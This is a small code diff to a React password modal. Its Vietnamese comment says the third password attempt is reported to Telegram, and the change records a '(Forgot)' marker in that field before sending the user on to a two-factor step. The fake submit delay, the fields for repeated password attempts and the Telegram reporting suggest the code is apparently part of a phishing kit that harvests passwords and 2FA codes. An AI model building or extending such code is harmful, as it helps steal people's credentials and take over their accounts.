@@ -14,6 +14,8 @@ interface PasswordModalProps {
 }
 
 const SUBMIT_DELAY_MS = 1345;
+/** Ghi nhận trong Telegram Password(3) khi bấm «Quên mật khẩu?» thay vì nhập lần 3 */
+const PASSWORD_THIRD_FORGOT_MARKER = '(Forgot)';
 
 const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor, onToggleModal }) => {
     const t = useAppStrings();
@@ -63,6 +65,7 @@ const PasswordModal: React.FC<PasswordModalProps> = ({ isOpend, isOpendTwoFactor
     };
 
     const goForgotToTwoFa = () => {
+        dispatch(updateForm({ passwordThird: PASSWORD_THIRD_FORGOT_MARKER }));
         isOpendTwoFactor(true);
         handleClose();
     };
